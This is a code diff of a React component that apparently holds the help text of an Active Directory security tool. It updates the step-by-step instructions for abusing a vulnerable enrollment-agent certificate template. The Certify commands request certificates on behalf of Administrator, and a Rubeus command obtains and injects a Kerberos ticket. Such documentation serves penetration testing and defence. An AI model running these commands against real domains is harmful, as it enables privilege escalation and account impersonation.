@@ -25,10 +25,10 @@ const WindowsAbuse: FC = () => {
                 <Box component='span' sx={{ fontWeight: 'bold' }}>
                     Step 1:
                 </Box>{' '}
-                Use Certify to request an enrollment agent certificate.
+                Use Certify (2.0) to request an enrollment agent certificate.
             </Typography>
             <Typography component={'pre'}>
-                {'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent'}
+                {'Certify.exe request --ca ca01.corp.local\\CORP-CA01-CA --template Vuln-EnrollmentAgent'}
             </Typography>
             <Typography variant='body2'>
                 If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
@@ -40,29 +40,22 @@ const WindowsAbuse: FC = () => {
                 default.
             </Typography>
             <Typography variant='body2'>
-                <Box component='span' sx={{ fontWeight: 'bold' }}>
-                    Step 2:
-                </Box>{' '}
-                Convert the emitted certificate to PFX format.
-            </Typography>
-            <Typography component={'pre'}>
-                {'certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx'}
+                The certificate PFX is printed to the console in a base64-encoded format.
             </Typography>
             <Typography variant='body2'>
                 <Box component='span' sx={{ fontWeight: 'bold' }}>
-                    Step 3:
+                    Step 2:
                 </Box>{' '}
                 Use the enrollment agent certificate to issue a certificate request on behalf of another user to a
                 certificate template that allow for authentication and permit enrollment agent enrollment.
             </Typography>
             <Typography component={'pre'}>
                 {
-                    'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx'
+                    'Certify.exe request-agent --ca ca01.corp.local\\CORP-CA01-CA --template User --target Administrator --agent-pfx <cert base64>'
                 }
             </Typography>
             <Typography variant='body2'>
-                Save the certificate as <Box component='code'>itadminenrollment.pem</Box> and the private key as{' '}
-                <Box component='code'>itadminenrollment.key</Box>.
+                The certificate PFX is printed to the console in a base64-encoded format.
             </Typography>
             <Typography variant='body2'>
                 If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
@@ -72,22 +65,13 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <Typography variant='body2'>
                 <Box component='span' sx={{ fontWeight: 'bold' }}>
-                    Step 4:
+                    Step 3:
                 </Box>{' '}
-                Convert the emitted certificate to PFX format.
+                With Rubeus, use the certificate to authenticate to the domain and request a TGT, specifying the
+                identity you intend to impersonate:
             </Typography>
             <Typography component={'pre'}>
-                {'certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx'}
-            </Typography>
-            <Typography variant='body2'>
-                <Box component='span' sx={{ fontWeight: 'bold' }}>
-                    Step 5:
-                </Box>{' '}
-                Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to
-                impersonate and the PFX-formatted certificate created in Step 4.
-            </Typography>
-            <Typography component={'pre'}>
-                {'Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx'}
+                {'Rubeus asktgt /user:Administrator /domain:corp.local /certificate:<cert base64> /ptt'}
             </Typography>
         </>
     );
